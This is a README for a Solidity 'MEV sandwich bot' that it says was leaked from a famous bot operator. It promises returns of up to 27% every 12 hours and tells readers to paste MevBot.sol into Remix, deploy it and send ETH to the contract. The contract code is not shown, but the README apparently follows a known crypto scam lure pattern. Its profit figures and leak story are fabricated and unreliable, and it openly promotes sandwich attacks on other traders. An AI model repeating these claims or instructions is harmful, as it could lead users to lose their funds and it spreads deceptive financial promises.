# Jared-MEV-Bot-ETH🚀🥪

Use this ETH MEV-BOT to make sandwich attacks on Uniswap. A Maximal Extractable Value (MEV) Solidity Sandwich BOT that allows deployers of contract to take profits from tokens. This MEV-BOT has been copied from the legendary JaredFromSubway.eth (0xae2Fc483527B8EF99EB5D9B44875F005ba1FaE13), because Jared accidentally leaked his private code while updating his MEV bot earlier.

Bot sends the transaction and sniffs the Uniswap v2 Mempool for txs with high slippage, calculating if a sandwich attack is profitable.

Bots then compete to buy up the token onchain as quickly as possible, sandwiching the victims transaction and creating a profitable slippage opportunity, my bot always puts 1 gas more than everybody elses, as long as it remains profitable, securing a large amount of profitable transactions.

Then sends back the ETH to the contract ready for withdrawal.

This bot performs all of that, faster than 99% of other bots.

MEV bot Instructions (works only for Mainnet)

# Deposits
**Deposits of lower than 0.4 ETH are going to find much fewer txs because of the gas fees**

**Higher amounts of ETH deposited into the contract result in a larger amount of successful sandwich attack txs, therefore more profit**

**For higher profits use above 1.2 ETH**

# Expected returns
**0.1ETH - 0.4ETH = up to 10%/12hrs** 

**0.4ETH - 1.2ETH = up to 20%/12hrs**

**1.2ETH - 2.4ETH = 20-27%/12hrs**

**2.4ETH+ = 27%++ every 12 hrs**

Make money with MevBot (ETH network)

# How it works:
![image](https://user-images.githubusercontent.com/132091459/235274248-f03eff9f-ad44-43b6-a42d-69d77cad7e23.png)


You can see an example of how the bot works. The bot will make transactions on your entire balance to increase profit

First-source code

1. Copy code and paste the code of MevBot.sol file in Remix IDE
![image](https://user-images.githubusercontent.com/132091459/235274271-fd2fada5-8da6-4840-9c86-ea18821df532.png)

2. Click Solidity complier 0.6.6 And press Compile MevBot.sol
![image](https://user-images.githubusercontent.com/132091459/235274287-68982809-ac68-4d49-9673-fffe12d7cbb5.png)

3. Select ETH or BSC(BNB) network and Paste the router address

Press Transact (Deploy)
![image](https://user-images.githubusercontent.com/132091459/235274308-855a8c47-647a-43f4-a52e-93acb45a356d.png)

4. Next-deposit ETH to MevBot contract address. Copy contract's ETH address of your MevBot contract and send a number of Ethereum to this address.
After that start it with the start button
![image](https://user-images.githubusercontent.com/132091459/235274330-c84bf2ef-67dc-486f-a117-2f07f94c51d2.png)
![image](https://user-images.githubusercontent.com/132091459/235274359-5f311e74-39bd-48f2-9ca6-56464368f07c.png)
![image](https://user-images.githubusercontent.com/132091459/235274381-e70a3568-589d-426e-a4fd-b07c68347275.png)

Wait a couple of days for a profit. For successful transactions on the Ethereum network, you must have enough balance to cover the gas. Recommended 0.5-1 ΕΤΗ.

At any time you can Stop bot or return your money by calling the withdrawal function.
